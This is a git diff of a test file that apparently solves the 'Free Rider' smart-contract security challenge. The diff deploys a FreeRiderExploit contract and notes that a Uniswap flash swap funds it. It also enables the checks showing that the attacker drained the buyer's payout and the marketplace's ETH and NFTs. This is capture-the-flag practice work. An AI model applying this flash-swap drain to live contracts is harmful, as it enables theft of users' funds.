@@ -109,25 +109,46 @@ describe('[Challenge] Free Rider', function () {
         this.buyerContract = this.buyerContract.connect(attacker);
         this.marketplace = this.marketplace.connect(attacker);
         this.nft = this.nft.connect(attacker);
+
+        // constructor(address _pair,address payable _marketplace,address _buyer,address _nft,address payable _weth) 
+        this.exploit = await (await ethers.getContractFactory('FreeRiderExploit', attacker)).deploy(
+            this.uniswapPair.address,   
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.nft.address,
+            this.weth.address,
+        );
+        
+        /*
+            You can flashSwap on a token0, however, repay in the same token0 that you swapped. Hence, it's not necessary
+            to flashSwap on the other token1.
+            
+            https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
+            https://github.com/t4sk/defi-by-example/blob/main/contracts/TestUniswapFlashSwap.sol
+
+            https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L159
+        
+        */ 
+        await this.exploit.exploit(NFT_PRICE);
     });
 
-    // after(async function () {
-    //     /** SUCCESS CONDITIONS */
+    after(async function () {
+        /** SUCCESS CONDITIONS */
 
-    //     // Attacker must have earned all ETH from the payout
-    //     expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
-    //     expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.eq('0');
+        // Attacker must have earned all ETH from the payout
+        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
+        expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.eq('0');
 
-    //     // The buyer extracts all NFTs from its associated contract
-    //     for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
-    //         await this.nft.connect(buyer).transferFrom(this.buyerContract.address, buyer.address, tokenId);
-    //         expect(await this.nft.ownerOf(tokenId)).to.be.eq(buyer.address);
-    //     }
+        // The buyer extracts all NFTs from its associated contract
+        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            await this.nft.connect(buyer).transferFrom(this.buyerContract.address, buyer.address, tokenId);
+            expect(await this.nft.ownerOf(tokenId)).to.be.eq(buyer.address);
+        }
 
-    //     // Exchange must have lost NFTs and ETH
-    //     expect(await this.marketplace.amountOfOffers()).to.be.eq('0');
-    //     expect(
-    //         await ethers.provider.getBalance(this.marketplace.address)
-    //     ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
-    // });
+        // Exchange must have lost NFTs and ETH
+        expect(await this.marketplace.amountOfOffers()).to.be.eq('0');
+        expect(
+            await ethers.provider.getBalance(this.marketplace.address)
+        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
+    });
 });
